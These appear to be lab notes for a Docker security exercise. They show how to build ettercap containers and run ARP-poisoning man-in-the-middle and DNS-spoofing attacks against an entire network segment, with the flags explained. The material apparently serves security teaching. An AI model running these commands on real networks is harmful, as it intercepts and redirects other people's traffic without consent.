git clone https://github.com/liranmatcu/Docker_Security_Labs.git
cd  Docker_Security_Labs/mimt/

# Start ettercap docker instances
docker-compose build
docker-compose up ettercap

## Or start one with doccker command directly
docker run --rm -it           \
      --cap-add SYS_ADMIN     \
      --cap-add NET_ADMIN     \
      eureka-ettercap         \
      -TbqM arp               \
      -oi eth0


docker run --rm -it           \
      --cap-add SYS_ADMIN     \
      --cap-add NET_ADMIN     \
      eureka-ettercap         \
      -T -Q -P dns_spoof -M arp  \
      -oi eth0 // //

ettercap -T -Q -i eth0 -P dns_spoof -M arp // //
-T: Specifies the use of the text-based interface
-q: Runs commands in quiet mode
-P dns_spoof: Specifies the use of the dns_spoof plug-in
-M arp: Initiates a MITM ARP poisoning attack to intercept packets between hosts
// //: Specifies the entire network as the targets


Reference:
https://hub.docker.com/r/mrecco/ettercap
https://github.com/MrEcco/docker-ettercap